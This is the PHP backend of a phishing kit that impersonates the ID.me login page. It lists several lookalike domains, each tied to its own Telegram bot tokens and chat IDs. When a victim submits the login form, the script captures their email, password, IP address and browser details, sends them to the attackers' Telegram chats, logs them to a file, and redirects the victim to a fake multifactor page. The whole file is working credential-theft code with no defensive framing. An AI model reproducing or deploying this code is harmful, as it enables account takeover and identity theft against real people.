<?php
ob_start();

$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],

    'illuminatigroup.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
        ],
        "redirect" => "https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminatiglobal.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
        ],
        "redirect" => "https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminatinetwork.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
        ],
        "redirect" => "https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminaticonnect.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
        ],
        "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],
];

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Unauthorized origin.");
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $log_file = __DIR__ . "/logs/idme_logins.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';

    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $message = "🔐 *ID.me Login Submission*\n\n" .
               "📧 *Email:* `$useremail`\n" .
               "🔑 *Password:* `$userpassword`\n" .
               "💾 *Remember Me:* $remember_me\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *User Agent:* " . substr($user_agent, 0, 100);

    foreach ($config['bots'] as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        if (curl_error($ch)) {
            log_entry("❌ Telegram error: " . curl_error($ch));
        }
        curl_close($ch);
    }

    log_entry("[$domain] Login from $ip - Email: $useremail");

    ob_end_clean();
    header("Location: " . $config['redirect']);
    exit;
}
?>
